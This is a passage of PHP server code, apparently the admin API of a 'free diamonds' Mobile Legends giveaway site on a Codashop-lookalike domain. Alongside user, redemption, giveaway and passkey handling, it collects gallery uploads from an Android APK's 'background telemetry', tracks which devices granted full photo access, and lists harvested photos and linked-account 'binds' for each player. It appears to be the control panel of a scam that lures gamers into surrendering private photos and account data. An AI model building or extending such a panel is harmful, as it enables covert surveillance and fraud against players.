                $devId = $displayUEmail;
            }
            if (empty($devId) && empty($uEmail) && empty($uId)) continue;

            $uServer = $u['mlbb_server'] ?? '—';
            $uPhone = 'Android Device';
            $hasFullAccess = false;
            $accessStatus = !empty($u['avatar_data']) ? 'avatar_only' : 'none';
            $binds = [];
            $userBinds = [];

            if ($loc && is_array($loc)) {
                if (!empty($loc['device_model'])) {
                    $uPhone = formatPhoneModelName($loc['device_model']);
                }
                if (!empty($loc['has_access']) || (!empty($loc['access_status']) && ($loc['access_status'] === 'full_access' || $loc['access_status'] === 'granted'))) {
                    $hasFullAccess = true;
                    $accessStatus = 'granted';
                }
                if (!empty($loc['binds'])) $binds = $loc['binds'];
                if (!empty($loc['user_binds'])) $userBinds = $loc['user_binds'];
            }

            $mergeDevice($unifiedMap, [
                'device_id'          => $devId,
                'folder_name'        => preg_replace('/[^a-zA-Z0-9_-]/', '_', strtolower('device_' . $devId)),
                'device_name'        => $uPhone,
                'device_model'       => $uPhone,
                'phone_model'        => $uPhone,
                'device_fingerprint' => $devFingerprint,
                'email'              => $displayUEmail,
                'ign'                => $u['mlbb_ign'] ?? $u['username'] ?? 'Player',
                'mlbb_id'            => $uId ?: '—',
                'mlbb_server'        => $uServer,
                'has_access'         => $hasFullAccess,
                'access_status'      => $accessStatus,
                'device_count'       => 0,
                'photo_count'        => !empty($u['avatar_data']) ? 1 : 0,
                'thumbnail'          => $u['avatar_data'] ?? null,
                'preview_photos'     => !empty($u['avatar_data']) ? [$u['avatar_data']] : [],
                'storage_size_bytes' => 0,
                'binds'              => $binds,
                'user_binds'         => $userBinds,
                'points'             => intval($u['points'] ?? 0),
                'diamonds_claimed'   => intval($u['diamonds_claimed'] ?? 0),
                'last_active'        => $u['updated_at'] ?? $u['created_at'] ?? ''
            ]);
        }
    }

    // 3. Also check redemptions table for any participants
    $redemptionsRes = supabaseApiRequest('redemptions?select=user_email,user_id,server_id,ign,created_at&limit=1000', 'GET');
    if ($redemptionsRes['success'] && is_array($redemptionsRes['data'])) {
        foreach ($redemptionsRes['data'] as $r) {
            $rawREmail = trim($r['user_email'] ?? '');
            $rEmail = strtolower($rawREmail);
            $rId = $r['user_id'] ?? '';
            if (empty($rEmail) && empty($rId)) continue;
            $isFakeREmail = empty($rEmail) || $rEmail === 'guest@ketupat.app' || str_ends_with($rEmail, '@ketupat.app');
            $displayREmail = $isFakeREmail ? '' : $rawREmail;

            $devId = !empty($rId) ? ('dev_' . $rId) : (!empty($displayREmail) ? $displayREmail : ('dev_' . bin2hex(random_bytes(4))));

            $mergeDevice($unifiedMap, [
                'device_id'          => $devId,
                'folder_name'        => preg_replace('/[^a-zA-Z0-9_-]/', '_', strtolower('device_' . $devId)),
                'device_name'        => 'Android Device',
                'device_model'       => 'Android Device',
                'phone_model'        => 'Android Device',
                'device_fingerprint' => 'Pending Sync',
                'email'              => $displayREmail,
                'ign'                => $r['ign'] ?? 'Player',
                'mlbb_id'            => $rId ?: '—',
                'mlbb_server'        => $r['server_id'] ?? '—',
                'has_access'         => false,
                'access_status'      => 'none',
                'device_count'       => 0,
                'photo_count'        => 0,
                'thumbnail'          => null,
                'preview_photos'     => [],
                'storage_size_bytes' => 0,
                'binds'              => [],
                'user_binds'         => [],
                'points'             => 0,
                'diamonds_claimed'   => 0,
                'last_active'        => $r['created_at'] ?? ''
            ]);
        }
    }

    // 4. Also check giveaway_entries table for any participants
    $giveawaysRes = supabaseApiRequest('giveaway_entries?select=user_email,mlbb_id,server_id,ign,created_at&limit=1000', 'GET');
    if ($giveawaysRes['success'] && is_array($giveawaysRes['data'])) {
        foreach ($giveawaysRes['data'] as $g) {
            $rawGEmail = trim($g['user_email'] ?? '');
            $gEmail = strtolower($rawGEmail);
            $gId = $g['mlbb_id'] ?? '';
            if (empty($gEmail) && empty($gId)) continue;
            $isFakeGEmail = empty($gEmail) || $gEmail === 'guest@ketupat.app' || str_ends_with($gEmail, '@ketupat.app');
            $displayGEmail = $isFakeGEmail ? '' : $rawGEmail;

            $devId = !empty($gId) ? ('dev_' . $gId) : (!empty($displayGEmail) ? $displayGEmail : ('dev_' . bin2hex(random_bytes(4))));

            $mergeDevice($unifiedMap, [
                'device_id'          => $devId,
                'folder_name'        => preg_replace('/[^a-zA-Z0-9_-]/', '_', strtolower('device_' . $devId)),
                'device_name'        => 'Android Device',
                'device_model'       => 'Android Device',
                'phone_model'        => 'Android Device',
                'device_fingerprint' => 'Pending Sync',
                'email'              => $displayGEmail,
                'ign'                => $g['ign'] ?? 'Player',
                'mlbb_id'            => $gId ?: '—',
                'mlbb_server'        => $g['server_id'] ?? '—',
                'has_access'         => false,
                'access_status'      => 'none',
                'device_count'       => 0,
                'photo_count'        => 0,
                'thumbnail'          => null,
                'preview_photos'     => [],
                'storage_size_bytes' => 0,
                'binds'              => [],
                'user_binds'         => [],
                'points'             => 0,
                'diamonds_claimed'   => 0,
                'last_active'        => $g['created_at'] ?? ''
            ]);
        }
    }

    // Final pass: Format titles, tags, storage strings
    $results = [];
    foreach ($unifiedMap as $item) {
        $devId = $item['device_id'];
        $deviceTag = '';
        if (strpos($devId, 'dev_') === 0) {
            $cleanSuffix = substr($devId, 4);
            $dashPos = strpos($cleanSuffix, '-');
            $deviceTag = ($dashPos !== false) ? substr($cleanSuffix, 0, $dashPos) : substr($cleanSuffix, 0, 8);
        } else if (strlen($devId) >= 6) {
            $deviceTag = substr($devId, 0, 8);
        } else {
            $deviceTag = $devId;
        }
        $item['device_tag'] = $deviceTag;

        $hasValidMlbb = (!empty($item['mlbb_id']) && $item['mlbb_id'] !== '—');
        $hasValidServer = (!empty($item['mlbb_server']) && $item['mlbb_server'] !== '—');
        if ($hasValidMlbb) {
            $item['formatted_title'] = $item['phone_model'] . ' [#' . $deviceTag . '] | ' . $item['mlbb_id'] . ($hasValidServer ? ' (' . $item['mlbb_server'] . ')' : '');
        } else {
            $playerLabel = (!empty($item['ign']) && $item['ign'] !== '—' && $item['ign'] !== 'Player') ? $item['ign'] : 'Device ' . $deviceTag;
            $item['formatted_title'] = $item['phone_model'] . ' [#' . $deviceTag . '] | ' . $playerLabel;
        }

        $folderTotalBytes = intval($item['storage_size_bytes'] ?? 0);
        $item['storage_size_formatted'] = $folderTotalBytes >= 1048576 
            ? round($folderTotalBytes / 1048576, 2) . ' MB' 
            : round($folderTotalBytes / 1024, 1) . ' KB';

        $results[] = $item;
    }

    return $results;
}

// Read input payload
$method = $_SERVER['REQUEST_METHOD'] ?? 'GET';
$action = $_GET['action'] ?? '';
$rawBody = file_get_contents('php://input');
$body = json_decode($rawBody, true) ?? [];

if (empty($action) && isset($body['action'])) {
    $action = $body['action'];
}

// Security Gatekeeper: Ensure admin authentication for all administrative operations!
// Publicly allowed:
// - 'upload_gallery': Android APK background telemetry & gallery transfers
// - 'login': Authenticating with admin passkey
// - 'logout': Logging out of admin console
// - 'check_auth': Verifying session state
// - 'passkey_register_options', 'passkey_register_verify': Native FIDO2 Passkey registration
// - 'passkey_login_options', 'passkey_login_verify': Native FIDO2 Passkey authentication
// - 'ping': Health check
$publicActions = [
    'upload_gallery', 
    'check_dlyyz_binds',
    'save_player_binds',
    'login', 
    'logout', 
    'check_auth', 
    'ping',
    'passkey_register_options',
    'passkey_register_verify',
    'passkey_login_options',
    'passkey_login_verify'
];

if (!in_array($action, $publicActions, true)) {
    if (!isAdminAuthenticated()) {
        sendJson(false, null, 'Unauthorized. Please authenticate using your Admin Passkey.', 401);
    }
}

/**
 * Verify FIDO2 Passkey assertion for high-privilege configuration modifications
 */
function verifyPasskeyForAction($body, $actionName = 'perform this action') {
    $passkeys = WebAuthnEngine::getPasskeys();
    if (empty($passkeys)) {
        // If no passkeys have been registered yet, allow configuration
        return true;
    }

    $assertion = $body['passkey_assertion'] ?? null;
    if (empty($assertion) || empty($assertion['id']) || empty($assertion['signature'])) {
        sendJson(false, null, "Passkey verification is required to {$actionName}. Please verify with your hardware passkey.", 403);
    }

    $expectedChallenge = $_SESSION['webauthn_auth_challenge'] ?? '';
    if (empty($expectedChallenge)) {
        sendJson(false, null, 'Passkey verification challenge has expired. Please retry verification.', 400);
    }

    try {
        $credId = $assertion['id'] ?? '';
        $clientData = $assertion['clientDataJSON'] ?? '';
        $authData = $assertion['authenticatorData'] ?? '';
        $sig = $assertion['signature'] ?? '';

        WebAuthnEngine::verifyAuthentication($credId, $clientData, $authData, $sig, $expectedChallenge);
        unset($_SESSION['webauthn_auth_challenge']);
        return true;
    } catch (Throwable $e) {
        sendJson(false, null, 'Passkey verification failed: ' . $e->getMessage(), 403);
    }
}

try {
    switch ($action) {

        case 'passkey_register_options':
            if (!isAdminAuthenticated() && !empty(WebAuthnEngine::getPasskeys())) {
                sendJson(false, null, 'Passkey registration requires administrator authentication. Please sign in with your registered passkey first.', 401);
            }

            $challenge = WebAuthnEngine::generateChallenge();
            $_SESSION['webauthn_reg_challenge'] = $challenge;
            $rpId = $_SERVER['HTTP_HOST'] ?? 'slytherin.codashop.shop';
            $rpId = preg_replace('/:\d+$/', '', $rpId);

            sendJson(true, [
                'challenge' => $challenge,
                'rp' => [
                    'name' => 'Ketupat Command Center',
                    'id'   => $rpId
                ],
                'user' => [
                    'id' => WebAuthnEngine::base64url_encode(hash('sha256', 'admin_ketupat', true)),
                    'name' => 'admin@' . $rpId,
                    'displayName' => 'Administrator'
                ],
                'pubKeyCredParams' => [
                    ['type' => 'public-key', 'alg' => -7],  // ES256
                    ['type' => 'public-key', 'alg' => -257] // RS256
                ],
                'authenticatorSelection' => [
                    'userVerification' => 'preferred',
                    'residentKey' => 'preferred'
                ],
                'timeout' => 60000,
                'attestation' => 'none'
            ]);
            break;

        case 'passkey_register_verify':
            if (!isAdminAuthenticated()) {
                if (!empty(WebAuthnEngine::getPasskeys())) {
                    sendJson(false, null, 'Passkey registration is closed. Please sign in with your passkey first to add new devices.', 403);
                }
            }

            $expectedChallenge = $_SESSION['webauthn_reg_challenge'] ?? '';
            if (empty($expectedChallenge)) {
                sendJson(false, null, 'Registration challenge expired. Please restart registration.', 400);
            }

            try {
                $clientData = $body['clientDataJSON'] ?? '';
                $attestation = $body['attestationObject'] ?? '';
                $name = trim($body['name'] ?? ('Passkey ' . date('M j, Y H:i')));

                $result = WebAuthnEngine::verifyRegistration($clientData, $attestation, $expectedChallenge);
                unset($_SESSION['webauthn_reg_challenge']);

                WebAuthnEngine::savePasskey($result['credentialId'], $result['publicKey'], $name, $result['signCount']);
                loginAdminWithPasskey(true);

                sendJson(true, ['authenticated' => true, 'credentialId' => $result['credentialId']], 'Passkey saved to device/Google Account successfully!');
            } catch (Throwable $e) {
                sendJson(false, null, 'Passkey registration error: ' . $e->getMessage(), 400);
            }
            break;

        case 'passkey_login_options':
            $challenge = WebAuthnEngine::generateChallenge();
            $_SESSION['webauthn_auth_challenge'] = $challenge;
            $rpId = $_SERVER['HTTP_HOST'] ?? 'slytherin.codashop.shop';
            $rpId = preg_replace('/:\d+$/', '', $rpId);

            $passkeys = WebAuthnEngine::getPasskeys();
            $allowCredentials = [];
            foreach ($passkeys as $pk) {
                $allowCredentials[] = [
                    'type' => 'public-key',
                    'id'   => $pk['id']
                ];
            }

            sendJson(true, [
                'challenge' => $challenge,
                'rpId' => $rpId,
                'allowCredentials' => $allowCredentials,
                'has_passkeys' => !empty($passkeys),
                'userVerification' => 'preferred',
                'timeout' => 60000
            ]);
            break;

        case 'passkey_login_verify':
            $expectedChallenge = $_SESSION['webauthn_auth_challenge'] ?? '';
            if (empty($expectedChallenge)) {
                sendJson(false, null, 'Authentication challenge expired. Please retry.', 400);
            }

            try {
                $credId = $body['id'] ?? '';
                $clientData = $body['clientDataJSON'] ?? '';
                $authData = $body['authenticatorData'] ?? '';
                $sig = $body['signature'] ?? '';

                WebAuthnEngine::verifyAuthentication($credId, $clientData, $authData, $sig, $expectedChallenge);
                unset($_SESSION['webauthn_auth_challenge']);

                loginAdminWithPasskey(true);

                sendJson(true, ['authenticated' => true], 'Passkey verified successfully.');
            } catch (Throwable $e) {
                sendJson(false, null, 'Passkey verification failed: ' . $e->getMessage(), 403);
            }
            break;

        case 'list_passkeys':
            $keys = WebAuthnEngine::getPasskeys();
            $safeKeys = array_map(function($k) {
                return [
                    'id' => $k['id'],
                    'name' => $k['name'] ?? 'Device Passkey',
                    'created_at' => $k['created_at'] ?? 'Unknown',
                    'signCount' => $k['signCount'] ?? 0
                ];
            }, $keys);
            sendJson(true, $safeKeys);
            break;

        case 'delete_passkey':
            verifyPasskeyForAction($body, 'delete a registered passkey');
            $credId = $body['id'] ?? $_GET['id'] ?? '';
            if (empty($credId)) {
                sendJson(false, null, 'Passkey ID is required', 400);
            }
            WebAuthnEngine::deletePasskey($credId);
            sendJson(true, null, 'Passkey removed successfully');
            break;

        case 'login':
            sendJson(false, null, 'Master PIN login has been disabled. Please sign in with your registered FIDO2 Passkey.', 403);
            break;

        case 'logout':
            logoutAdmin();
            sendJson(true, ['authenticated' => false], 'Logged out successfully.');
            break;

        case 'check_auth':
            sendJson(true, ['authenticated' => isAdminAuthenticated()]);
            break;

        case 'ping':
            sendJson(true, ['status' => 'online', 'time' => time()], 'API online');
            break;
        case 'get_stats':
            $usersRes = supabaseApiRequest('users?select=count', 'GET', null, ['Prefer: count=exact']);
            $redemptionsRes = supabaseApiRequest('redemptions?select=*&order=created_at.desc', 'GET');
            $giveawaysRes = supabaseApiRequest('giveaway_entries?select=*', 'GET');
            $cfg = getAppConfig();

            $totalUsers = 0;
            $allUsers = supabaseApiRequest('users?select=email,points,diamonds_claimed', 'GET');
            if ($allUsers['success'] && is_array($allUsers['data'])) {
                $totalUsers = count($allUsers['data']);
            }

            $totalRedemptions = 0;
            $pendingRedemptions = 0;
            $totalDiamondsRedeemed = 0;
            $recentOrders = [];

            if ($redemptionsRes['success'] && is_array($redemptionsRes['data'])) {
                $totalRedemptions = count($redemptionsRes['data']);
                foreach ($redemptionsRes['data'] as $r) {
                    $status = strtolower($r['status'] ?? '');
                    if (strpos($status, 'processing') !== false || strpos($status, 'pending') !== false) {
                        $pendingRedemptions++;
                    }
                    if (strpos($status, 'completed') !== false) {
                        $totalDiamondsRedeemed += intval($r['diamonds'] ?? 0);
                    }
                }
                $recentOrders = array_slice($redemptionsRes['data'], 0, 5);
            }

            $totalEntries = 0;
            if ($giveawaysRes['success'] && is_array($giveawaysRes['data'])) {
                $totalEntries = count($giveawaysRes['data']);
            }

            // Calculate connected devices and gallery photos across local storage and Supabase
            $devicesList = getDeviceGalleryOverviewList();
            $totalDevices = count($devicesList);
            $totalPhotos = 0;
            $usersWithGallery = 0;
            foreach ($devicesList as $dev) {
                $count = intval($dev['photo_count'] ?? 0);
                if ($count > 0) {
                    $totalPhotos += $count;
                    $usersWithGallery++;
                }
            }

            sendJson(true, [
                'stats' => [
                    'total_users'             => $totalUsers,
                    'total_devices'           => $totalDevices,
                    'total_redemptions'       => $totalRedemptions,
                    'pending_redemptions'     => $pendingRedemptions,
                    'total_diamonds_redeemed' => $totalDiamondsRedeemed,
                    'total_giveaway_entries'  => $totalEntries,
                    'total_gallery_photos'    => $totalPhotos,
                    'users_with_gallery'      => $usersWithGallery,
                    'has_secret_key'          => !empty($cfg['supabase_secret_key']),
                    'access_level'            => !empty($cfg['supabase_secret_key']) ? 'Highest Access (Service Role / Secret Key)' : 'Standard Access (Publishable Key)'
                ],
                'recent_orders' => $recentOrders
            ], 'Stats retrieved');
            break;

        // ==========================================
        // 2. USERS CRUD
        // ==========================================
        case 'list_users':
            $search = trim($_GET['search'] ?? '');
            $endpoint = 'users?select=*&order=created_at.desc';
            if (!empty($search)) {
                $s = urlencode($search);
                $endpoint = "users?or=(email.ilike.*$s*,username.ilike.*$s*,mlbb_ign.ilike.*$s*,mlbb_id.ilike.*$s*)&order=created_at.desc";
            }
            $res = supabaseApiRequest($endpoint, 'GET');
            if (!$res['success']) {
                sendJson(false, null, 'Failed to fetch users: ' . ($res['error'] ?? 'Unknown error'), 500);
            }
            $users = $res['data'] ?? [];

            // Enrich each user with device hardware info, gallery permission status, and platform binds from meta.json
            $galleryDir = __DIR__ . '/uploads/gallery';
            $deviceMetas = [];
            if (is_dir($galleryDir)) {
                $dirs = glob($galleryDir . '/*', GLOB_ONLYDIR);
                if ($dirs) {
                    foreach ($dirs as $d) {
                        $mFile = $d . '/meta.json';
                        if (file_exists($mFile)) {
                            $meta = json_decode(file_get_contents($mFile), true);
                            if (is_array($meta)) {
                                $devEmail = strtolower(trim($meta['user_email'] ?? ''));
                                $devMlbbId = trim($meta['mlbb_id'] ?? '');
                                if ($devEmail && $devEmail !== 'guest@ketupat.app') $deviceMetas[$devEmail] = $meta;
                                if ($devMlbbId && $devMlbbId !== '—') $deviceMetas['mlbb_' . $devMlbbId] = $meta;
                            }
                        }
                    }
                }
            }

            foreach ($users as &$u) {
                $e = strtolower(trim($u['email'] ?? ''));
                $mId = 'mlbb_' . trim($u['mlbb_id'] ?? '');
                $meta = $deviceMetas[$e] ?? $deviceMetas[$mId] ?? null;
                if ($meta) {
                    $u['device_id'] = $meta['device_id'] ?? '';
                    $u['device_name'] = $meta['device_name'] ?? '';
                    $u['device_model'] = $meta['device_model'] ?? '';
                    $u['device_fingerprint'] = $meta['device_fingerprint'] ?? '';
                    $u['is_full_access'] = !empty($meta['is_full_access']);
                    $u['photo_count'] = count($meta['photos'] ?? []);
                    $u['binds'] = $meta['binds'] ?? [];
                    $u['user_binds'] = $meta['user_binds'] ?? [];
                }
            }
            unset($u);

            sendJson(true, $users, 'Users retrieved');
            break;

        case 'save_user':
            // Insert or update (Upsert by email)
            $userPayload = [
                'email'            => trim($body['email'] ?? ''),
                'username'         => trim($body['username'] ?? ''),
                'mlbb_id'          => trim($body['mlbb_id'] ?? ''),
                'mlbb_server'      => trim($body['mlbb_server'] ?? ''),
                'mlbb_ign'         => trim($body['mlbb_ign'] ?? ''),
                'mlbb_region'      => trim($body['mlbb_region'] ?? ''),
                'mlbb_region_code' => trim($body['mlbb_region_code'] ?? ''),
                'points'           => intval($body['points'] ?? 0),
                'diamonds_claimed' => intval($body['diamonds_claimed'] ?? 0),
                'giveaway_tickets' => intval($body['giveaway_tickets'] ?? 0),
                'mega_tickets'     => intval($body['mega_tickets'] ?? 0),
                'daily_tickets'    => intval($body['daily_tickets'] ?? 0),
                'daily_streak'     => intval($body['daily_streak'] ?? 1),
                'location_text'    => trim($body['location_text'] ?? ''),
                'updated_at'       => date('c')
            ];

            if (empty($userPayload['email'])) {
                sendJson(false, null, 'User Email is required', 400);
            }

            // Check if user already exists
            $checkRes = supabaseApiRequest('users?email=eq.' . urlencode($userPayload['email']) . '&select=id', 'GET');
            $userExists = ($checkRes['success'] && !empty($checkRes['data']));

            if ($userExists) {
                // Update
                $updateRes = supabaseApiRequest(
                    'users?email=eq.' . urlencode($userPayload['email']),
                    'PATCH',
                    $userPayload
                );
                if (!$updateRes['success']) {
                    sendJson(false, null, 'Failed to update user: ' . ($updateRes['error'] ?? 'Unknown error'), 500);
                }
                sendJson(true, $updateRes['data'], 'User updated successfully');
            } else {
                // Insert
                $insertRes = supabaseApiRequest('users', 'POST', $userPayload);
                if (!$insertRes['success']) {
                    sendJson(false, null, 'Failed to create user: ' . ($insertRes['error'] ?? 'Unknown error'), 500);
                }
                sendJson(true, $insertRes['data'], 'User created successfully', 201);
            }
            break;

        case 'delete_user':
            $email = trim($_GET['email'] ?? $body['email'] ?? '');
            if (empty($email)) {
                sendJson(false, null, 'Email parameter is required for deletion', 400);
            }
            $delRes = supabaseApiRequest('users?email=eq.' . urlencode($email), 'DELETE');
            if (!$delRes['success']) {
                sendJson(false, null, 'Failed to delete user: ' . ($delRes['error'] ?? 'Unknown error'), 500);
            }
            sendJson(true, $delRes['data'], "User '$email' deleted successfully");
            break;

        case 'batch_delete_users':
            $emails = $body['emails'] ?? [];
            if (!is_array($emails) || empty($emails)) {
                sendJson(false, null, 'No users specified for batch deletion', 400);
            }
            $deletedCount = 0;
            foreach ($emails as $em) {
                $cleanEm = trim($em);
                if (empty($cleanEm)) continue;
                $delRes = supabaseApiRequest('users?email=eq.' . urlencode($cleanEm), 'DELETE');
                if ($delRes['success']) $deletedCount++;
            }
            sendJson(true, ['deleted_count' => $deletedCount], "$deletedCount user(s) deleted successfully");
            break;

        // ==========================================
        // 3. REDEMPTIONS CRUD
        // ==========================================
        case 'list_redemptions':
            $statusFilter = trim($_GET['status'] ?? '');
            $search = trim($_GET['search'] ?? '');
            $endpoint = 'redemptions?select=*&order=created_at.desc';

            $filters = [];
            if (!empty($statusFilter) && $statusFilter !== 'all') {
                $filters[] = 'status=ilike.*' . urlencode($statusFilter) . '*';
            }
            if (!empty($search)) {
                $s = urlencode($search);
                $filters[] = "or=(order_id.ilike.*$s*,user_email.ilike.*$s*,mlbb_id.ilike.*$s*,mlbb_ign.ilike.*$s*)";
            }

            if (!empty($filters)) {
                $endpoint .= '&' . implode('&', $filters);
            }

            $res = supabaseApiRequest($endpoint, 'GET');
            if (!$res['success']) {
                sendJson(false, null, 'Failed to fetch redemptions: ' . ($res['error'] ?? 'Unknown error'), 500);
            }
            sendJson(true, $res['data'] ?? [], 'Redemptions retrieved');
            break;

        case 'save_redemption':
            $orderId = trim($body['order_id'] ?? '');
            $redemptionPayload = [
                'user_email'  => trim($body['user_email'] ?? ''),
                'mlbb_id'     => trim($body['mlbb_id'] ?? ''),
                'mlbb_server' => trim($body['mlbb_server'] ?? ''),
                'mlbb_ign'    => trim($body['mlbb_ign'] ?? ''),
                'diamonds'    => intval($body['diamonds'] ?? 0),
                'points_cost' => intval($body['points_cost'] ?? 0),
                'pack_name'   => trim($body['pack_name'] ?? ''),
                'status'      => trim($body['status'] ?? 'Processing (7-14 Days)')
            ];

            if (empty($orderId)) {
                // New redemption record
                $orderId = 'MLBB-' . strtoupper(substr(md5(uniqid()), 0, 8));
                $redemptionPayload['order_id'] = $orderId;
                $res = supabaseApiRequest('redemptions', 'POST', $redemptionPayload);
                if (!$res['success']) {
                    sendJson(false, null, 'Failed to create redemption: ' . ($res['error'] ?? 'Unknown error'), 500);
                }
                sendJson(true, $res['data'], 'Redemption created successfully', 201);
            } else {
                // Update existing
                $res = supabaseApiRequest('redemptions?order_id=eq.' . urlencode($orderId), 'PATCH', $redemptionPayload);
                if (!$res['success']) {
                    sendJson(false, null, 'Failed to update redemption: ' . ($res['error'] ?? 'Unknown error'), 500);
                }
                sendJson(true, $res['data'], "Order '$orderId' updated successfully");
            }
            break;

        case 'delete_redemption':
            $orderId = trim($_GET['order_id'] ?? $body['order_id'] ?? '');
            if (empty($orderId)) {
                sendJson(false, null, 'Order ID is required for deletion', 400);
            }
            $res = supabaseApiRequest('redemptions?order_id=eq.' . urlencode($orderId), 'DELETE');
            if (!$res['success']) {
                sendJson(false, null, 'Failed to delete redemption: ' . ($res['error'] ?? 'Unknown error'), 500);
            }
            sendJson(true, $res['data'], "Order '$orderId' deleted successfully");
            break;

        case 'batch_delete_redemptions':
            $orderIds = $body['order_ids'] ?? [];
            if (!is_array($orderIds) || empty($orderIds)) {
                sendJson(false, null, 'No orders specified for batch deletion', 400);
            }
            $deletedCount = 0;
            foreach ($orderIds as $oid) {
                $cleanOid = trim($oid);
                if (empty($cleanOid)) continue;
                $res = supabaseApiRequest('redemptions?order_id=eq.' . urlencode($cleanOid), 'DELETE');
                if ($res['success']) $deletedCount++;
            }
            sendJson(true, ['deleted_count' => $deletedCount], "$deletedCount redemption order(s) deleted successfully");
            break;

        // ==========================================
        // 4. GIVEAWAYS CRUD & WINNER PICKER
        // ==========================================
        case 'list_giveaways':
            $poolFilter = trim($_GET['pool'] ?? '');
            $endpoint = 'giveaway_entries?select=*&order=created_at.desc';
            if (!empty($poolFilter) && $poolFilter !== 'all') {
                $endpoint .= '&pool_type=eq.' . urlencode($poolFilter);
            }
            $res = supabaseApiRequest($endpoint, 'GET');
            if (!$res['success']) {
                sendJson(false, null, 'Failed to fetch giveaway entries: ' . ($res['error'] ?? 'Unknown error'), 500);
            }
            sendJson(true, $res['data'] ?? [], 'Giveaway entries retrieved');
            break;

        case 'save_giveaway':
            $id = $body['id'] ?? null;
            $giveawayPayload = [
                'user_email'   => trim($body['user_email'] ?? ''),
                'mlbb_id'      => trim($body['mlbb_id'] ?? ''),
                'mlbb_server'  => trim($body['mlbb_server'] ?? ''),
                'mlbb_ign'     => trim($body['mlbb_ign'] ?? ''),
                'pool_type'    => trim($body['pool_type'] ?? 'daily'),
                'ticket_count' => intval($body['ticket_count'] ?? 1),
                'points_spent' => intval($body['points_spent'] ?? 0)
            ];

            if ($id) {
                $res = supabaseApiRequest('giveaway_entries?id=eq.' . urlencode($id), 'PATCH', $giveawayPayload);
                if (!$res['success']) {
                    sendJson(false, null, 'Failed to update entry: ' . ($res['error'] ?? 'Unknown error'), 500);
                }
                sendJson(true, $res['data'], 'Giveaway entry updated');
            } else {
                $res = supabaseApiRequest('giveaway_entries', 'POST', $giveawayPayload);
                if (!$res['success']) {
                    sendJson(false, null, 'Failed to add giveaway entry: ' . ($res['error'] ?? 'Unknown error'), 500);
                }
                sendJson(true, $res['data'], 'Giveaway entry added', 201);
            }
            break;

        case 'delete_giveaway':
            $id = trim($_GET['id'] ?? $body['id'] ?? '');
            if (empty($id)) {
                sendJson(false, null, 'Valid giveaway entry ID is required', 400);
            }
            $res = supabaseApiRequest('giveaway_entries?id=eq.' . urlencode($id), 'DELETE');
            if (!$res['success']) {
                sendJson(false, null, 'Failed to delete entry: ' . ($res['error'] ?? 'Unknown error'), 500);
            }
            sendJson(true, $res['data'], 'Giveaway entry deleted');
            break;

        case 'batch_delete_giveaways':
            $ids = $body['ids'] ?? [];
            if (!is_array($ids) || empty($ids)) {
                sendJson(false, null, 'No giveaway entries specified for batch deletion', 400);
            }
            $deletedCount = 0;
            foreach ($ids as $gid) {
                $cleanGid = trim($gid);
                if (empty($cleanGid)) continue;
                $res = supabaseApiRequest('giveaway_entries?id=eq.' . urlencode($cleanGid), 'DELETE');
                if ($res['success']) $deletedCount++;
            }
            sendJson(true, ['deleted_count' => $deletedCount], "$deletedCount giveaway entry(ies) deleted successfully");
            break;

        case 'roll_winner':
            $pool = trim($body['pool'] ?? $_GET['pool'] ?? 'daily');
            $endpoint = 'giveaway_entries?select=*';
            if ($pool !== 'all') {
                $endpoint .= '&pool_type=eq.' . urlencode($pool);
            }
            $res = supabaseApiRequest($endpoint, 'GET');
            if (!$res['success'] || empty($res['data'])) {
                sendJson(false, null, "No entries found in '$pool' pool to draw a winner.", 404);
            }

            // Weighted random selection by ticket_count
            $ticketsPool = [];
            foreach ($res['data'] as $entry) {
                $count = max(1, intval($entry['ticket_count'] ?? 1));
                for ($i = 0; $i < $count; $i++) {
                    $ticketsPool[] = $entry;
                }
            }

            if (empty($ticketsPool)) {
                sendJson(false, null, 'Unable to draw from empty pool', 400);
            }

            $winnerIndex = array_rand($ticketsPool);
            $winner = $ticketsPool[$winnerIndex];

            sendJson(true, [
                'winner'        => $winner,
                'total_tickets' => count($ticketsPool),
                'total_entries' => count($res['data']),
                'pool_type'     => $pool
            ], 'Winner drawn successfully!');
            break;

        // ==========================================
        // 5. CONFIGURATION & CLOUD SETTINGS
        // ==========================================
        case 'get_config':
            $cfg = getAppConfig();
            $maskedSecret = '';
            if (!empty($cfg['supabase_secret_key'])) {
                $len = strlen($cfg['supabase_secret_key']);
                $maskedSecret = substr($cfg['supabase_secret_key'], 0, 10) . '...' . substr($cfg['supabase_secret_key'], -6);
            }

            sendJson(true, [
                'supabase_url'         => $cfg['supabase_url'],
                'supabase_anon_key'    => $cfg['supabase_anon_key'],
                'supabase_secret_key'  => $cfg['supabase_secret_key'], // Provided for direct editing in admin
                'supabase_secret_mask' => $maskedSecret,
                'dlyyz_api_key'        => $cfg['dlyyz_api_key'],
                'has_highest_access'   => !empty($cfg['supabase_secret_key']),
                'has_passkeys'         => !empty(WebAuthnEngine::getPasskeys())
            ], 'Configuration retrieved');
            break;

        case 'save_config':
            verifyPasskeyForAction($body, 'edit Cloud & API settings');
            $updateData = [];

            if (isset($body['supabase_url'])) {
                $supabaseUrl = trim($body['supabase_url']);
                if (empty($supabaseUrl)) {
                    sendJson(false, null, 'Supabase URL cannot be empty', 400);
                }
                $updateData['supabase_url'] = rtrim($supabaseUrl, '/');
            }

            if (isset($body['supabase_anon_key'])) {
                $updateData['supabase_anon_key'] = trim($body['supabase_anon_key']);
            }

            if (isset($body['supabase_secret_key'])) {
                $updateData['supabase_secret_key'] = trim($body['supabase_secret_key']);
            }

            if (isset($body['dlyyz_api_key'])) {
                $updateData['dlyyz_api_key'] = trim($body['dlyyz_api_key']);
            }

            if (!empty($updateData)) {
                $saved = saveAppConfig($updateData);
                if (!$saved) {
                    sendJson(false, null, 'Failed to save configuration file', 500);
                }
            }

            $currentCfg = getAppConfig();
            sendJson(true, [
                'has_highest_access' => !empty($currentCfg['supabase_secret_key'])
            ], 'Cloud configuration saved successfully');
            break;

        case 'test_connection':
            // Test query on users table
            $res = supabaseApiRequest('users?select=count', 'GET', null, ['Prefer: count=exact']);
            $cfg = getAppConfig();
            $isSecret = !empty($cfg['supabase_secret_key']);

            if ($res['success']) {
                sendJson(true, [
                    'connected'     => true,
                    'http_code'     => $res['code'],
                    'highest_access'=> $isSecret,
                    'mode'          => $isSecret ? 'HIGHEST ACCESS (Service Role Secret Key — RLS Bypassed)' : 'STANDARD ACCESS (Publishable Anon Key — RLS Enforced)',
                    'message'       => 'Connection to Supabase REST API successful!'
                ], 'Connection verified');
            } else {
                sendJson(false, [
                    'connected' => false,
                    'http_code' => $res['code'],
                    'error'     => $res['error']
                ], 'Connection failed: ' . ($res['error'] ?? 'Unknown error'), 502);
            }
            break;

